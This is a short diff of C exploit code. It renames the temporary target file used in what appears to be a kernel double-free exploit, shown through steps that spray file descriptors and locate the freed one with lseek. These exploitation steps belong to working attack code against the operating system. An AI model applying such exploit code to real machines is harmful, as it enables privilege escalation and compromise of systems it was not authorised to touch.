@@ -28,7 +28,7 @@ int main(void)
   init();
 
   // create target file
-  tmp_a = SYSCHK(open("/tmp/a", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
+  tmp_a = SYSCHK(open("/tmp/chovid99", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
   SYSCHK(close(tmp_a));
 
   puts("[+] create and free heap allocation for double free later");
@@ -47,7 +47,7 @@ int main(void)
   puts("[+] Spray FDs");
   int spray_fds[NUM_SPRAY_FDS];
   for(int i =0;i<NUM_SPRAY_FDS;i++){
-    spray_fds[i] = open("/tmp/a", O_RDWR); // /tmp/a is a writable file
+    spray_fds[i] = open("/tmp/chovid99", O_RDWR); // /tmp/a is a writable file
     if (spray_fds[i] == -1) {
       puts("Failed to open FDs");
       return EXIT_FAILURE;
@@ -67,7 +67,7 @@ int main(void)
   puts("[+] Find the freed FD using lseek");
   int spray_fds_2[NUM_SPRAY_FDS];
   for (int i = 0; i < NUM_SPRAY_FDS; i++) {
-    spray_fds_2[i] = open("/tmp/a", O_RDWR);
+    spray_fds_2[i] = open("/tmp/chovid99", O_RDWR);
     lseek(spray_fds_2[i], 0x8, SEEK_SET);
   }
   // After: 2 fd 1 refcount (Because new file)
